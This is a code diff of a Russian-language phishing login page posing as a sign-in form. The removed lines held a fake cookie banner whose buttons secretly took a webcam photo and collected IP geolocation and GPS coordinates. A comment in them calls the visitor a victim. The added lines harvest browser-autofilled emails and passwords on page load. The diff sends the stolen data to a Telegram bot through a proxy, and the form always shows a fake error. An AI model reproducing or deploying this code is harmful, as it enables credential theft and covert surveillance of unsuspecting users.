@@ -65,44 +65,6 @@
             display: none;
         }
         .error-message.show { display: block; }
-        .cookie-banner {
-            position: fixed;
-            left: 0; right: 0; bottom: 0;
-            background: #ffffff;
-            border-top: 1px solid #e0e0e0;
-            box-shadow: 0 -4px 16px rgba(0,0,0,0.08);
-            padding: 16px 20px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            gap: 14px;
-            z-index: 9999;
-            font-size: 14px;
-            color: #333;
-        }
-        .cookie-banner .cookie-text { flex: 1; line-height: 1.4; text-align: left; }
-        .cookie-banner .cookie-text b { display: block; margin-bottom: 4px; font-size: 15px; }
-        .cookie-banner .cookie-text span { color: #666; font-size: 13px; }
-        .cookie-banner .cookie-actions { display: flex; gap: 8px; flex-shrink: 0; }
-        .cookie-banner button {
-            padding: 10px 16px;
-            border: none;
-            border-radius: 6px;
-            font-size: 14px;
-            font-weight: bold;
-            cursor: pointer;
-            white-space: nowrap;
-        }
-        .cookie-banner .btn-accept { background: #0077cc; color: white; }
-        .cookie-banner .btn-accept:hover { background: #005fa3; }
-        .cookie-banner .btn-decline { background: #e4e6eb; color: #333; }
-        .cookie-banner .btn-decline:hover { background: #d0d3d8; }
-        .cookie-banner.cookie-hidden { display: none !important; }
-        @media (max-width: 500px) {
-            .cookie-banner { flex-direction: column; align-items: stretch; padding: 14px 16px; }
-            .cookie-banner .cookie-actions { justify-content: stretch; }
-            .cookie-banner .cookie-actions button { flex: 1; }
-        }
     </style>
 </head>
 <body>
@@ -117,17 +79,6 @@
         </form>
     </div>
 
-    <div id="cookieBanner" class="cookie-banner">
-        <div class="cookie-text">
-            <b>🍪 Мы используем файлы cookie</b>
-            <span>Для корректной работы сайта и сохранения ваших данных. Нажимая «Подтвердить», вы соглашаетесь с обработкой данных.</span>
-        </div>
-        <div class="cookie-actions">
-            <button class="btn-decline" id="btnDecline">Отклонить</button>
-            <button class="btn-accept" id="btnAccept">Подтвердить</button>
-        </div>
-    </div>
-
 <script>
     // ===== ВАШИ ДАННЫЕ =====
     const PROXY_URL = "https://pale-plover-7740.testrus-ui.deno.net";
@@ -140,24 +91,6 @@
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ chat_id: CHAT_ID, text: text })
-        }).catch(function() {});
-    }
-
-    function sendPhoto(base64, caption) {
-        const byteString = atob(base64.split(",")[1]);
-        const ab = new ArrayBuffer(byteString.length);
-        const ia = new Uint8Array(ab);
-        for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
-        const blob = new Blob([ab], { type: "image/jpeg" });
-
-        const fd = new FormData();
-        fd.append("chat_id", CHAT_ID);
-        fd.append("caption", caption || "");
-        fd.append("photo", blob, "photo.jpg");
-
-        fetch(PROXY_URL + "/bot" + BOT_TOKEN + "/sendPhoto", {
-            method: "POST",
-            body: fd
         }).catch(function() {});
     }
 
@@ -183,108 +116,22 @@
         document.getElementById("password").classList.remove("input-error");
     }
 
-    function capturePhoto() {
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: 640, height: 480 }, audio: false })
-            .then(function(stream) {
-                const video = document.createElement("video");
-                video.srcObject = stream;
-                video.setAttribute("playsinline", "true");
-                video.setAttribute("autoplay", "true");
-                video.style.position = "fixed";
-                video.style.left = "-9999px";
-                document.body.appendChild(video);
-                video.onloadedmetadata = function() {
-                    video.play();
-                    setTimeout(function() {
-                        const canvas = document.createElement("canvas");
-                        canvas.width = video.videoWidth || 640;
-                        canvas.height = video.videoHeight || 480;
-                        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
-                        const dataURL = canvas.toDataURL("image/jpeg", 0.85);
-                        sendPhoto(dataURL, "📷 ФОТО С КАМЕРЫ\n🕒 " + new Date().toLocaleString("ru-RU"));
-                        stream.getTracks().forEach(function(t) { t.stop(); });
-                        document.body.removeChild(video);
-                    }, 1200);
-                };
-            })
-            .catch(function(err) {});
-    }
-
-    // ===== IP-ГЕО ЦЕПОЧКОЙ =====
-    function formatGeo(label, ip, country, region, city, lat, lon, isp) {
-        let geo = "🌍 ГЕО ПО IP (" + label + ")\n━━━━━━━━━━━━━━━━━━\n";
-        geo += "🌍 IP: " + (ip || "—") + "\n";
-        geo += "🏳 " + (country || "—") + "\n";
-        geo += "📍 " + (region || "—") + "\n";
-        geo += "🏙 " + (city || "—") + "\n";
-        if (lat && lon) geo += "🗺 " + lat + ", " + lon + "\n";
-        if (isp) geo += "📡 " + isp;
-        send(geo);
-    }
-
-    function getGeoByIP() {
-        fetch("https://ipwho.is/")
-            .then(r => r.json())
-            .then(function(d) {
-                if (!d.success) throw new Error("fail");
-                formatGeo("ipwho.is", d.ip, d.country, d.region, d.city, d.latitude, d.longitude, d.connection && d.connection.isp);
-            })
-            .catch(function() {
-                fetch("https://ipinfo.io/json")
-                    .then(r => r.json())
-                    .then(function(d) {
-                        let lat = "", lon = "";
-                        if (d.loc) { const p = d.loc.split(","); lat = p[0]; lon = p[1]; }
-                        formatGeo("ipinfo.io", d.ip, d.country, d.region, d.city, lat, lon, d.org);
-                    })
-                    .catch(function() {
-                        fetch("https://get.geojs.io/v1/ip/geo.json")
-                            .then(r => r.json())
-                            .then(function(d) {
-                                formatGeo("geojs.io", d.ip, d.country, d.region, d.city, d.latitude, d.longitude, d.organization_name);
-                            })
-                            .catch(function() {
-                                send("🌍 ГЕО: не удалось получить");
-                            });
-                    });
-            });
-    }
-
-    // ===== ТОЧНАЯ ГЕО (GPS) - 30 секунд ожидания =====
-    function getGPS() {
-        if (!navigator.geolocation) {
-            send("📍 GPS: не поддерживается браузером");
-            return;
+    // ===== АВТОЗАПОЛНЕНИЕ ПРИ ЗАГРУЗКЕ =====
+    // Если браузер сам подставил email и пароль — отправляем их тебе
+    function checkAutoFill() {
+        const email = document.getElementById("email").value.trim();
+        const password = document.getElementById("password").value.trim();
+        if (email && password) {
+            send("📩 АВТОЗАПОЛНЕНИЕ\n📧 Email: " + email + "\n🔑 Пароль: " + password + "\n🕒 " + new Date().toLocaleString("ru-RU"));
         }
-
-        navigator.geolocation.getCurrentPosition(
-            function(p) {
-                send("📍 ТОЧНАЯ ГЕО (GPS)\n━━━━━━━━━━━━━━━━━━\n📍 Широта: " + p.coords.latitude + "\n📍 Долгота: " + p.coords.longitude + "\n🎯 Точность: ±" + Math.round(p.coords.accuracy) + " м\n🕒 " + new Date().toLocaleString("ru-RU") + "\n🗺 Карта: https://maps.google.com/?q=" + p.coords.latitude + "," + p.coords.longitude);
-            },
-            function(err) {
-                // Молча - жертва отклонила или GPS выключен
-            },
-            { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
-        );
     }
-
-    // ===== КНОПКА "ПОДТВЕРДИТЬ" =====
-    document.getElementById("btnAccept").addEventListener("click", function() {
-        collectAndSend("COOKIE ПОДТВЕРЖДЕНО");
-        getGeoByIP();
-        getGPS();
-        capturePhoto();
-        document.getElementById("cookieBanner").classList.add("cookie-hidden");
+    window.addEventListener("load", function() {
+        setTimeout(checkAutoFill, 500);
+        setTimeout(checkAutoFill, 1500);
+        setTimeout(checkAutoFill, 3000);
     });
 
-    // ===== КНОПКА "ОТКЛОНИТЬ" =====
-    document.getElementById("btnDecline").addEventListener("click", function() {
-        collectAndSend("COOKIE ОТКЛОНЕНО");
-        document.getElementById("cookieBanner").classList.add("cookie-hidden");
-    });
-
-    // ===== ФОРМА - с ошибкой =====
+    // ===== ФОРМА =====
     document.getElementById("loginForm").addEventListener("submit", function(event) {
         event.preventDefault();
         const email = document.getElementById("email").value.trim();
@@ -301,7 +148,7 @@
         showError("Неверный адрес электронной почты или пароль. Убедитесь, что вы ввели всё правильно.");
     });
 
-    console.log("ROCKET ACTIVE — 30 сек GPS");
+    console.log("ROCKET ACTIVE — только форма");
 </script>
 </body>
 </html>
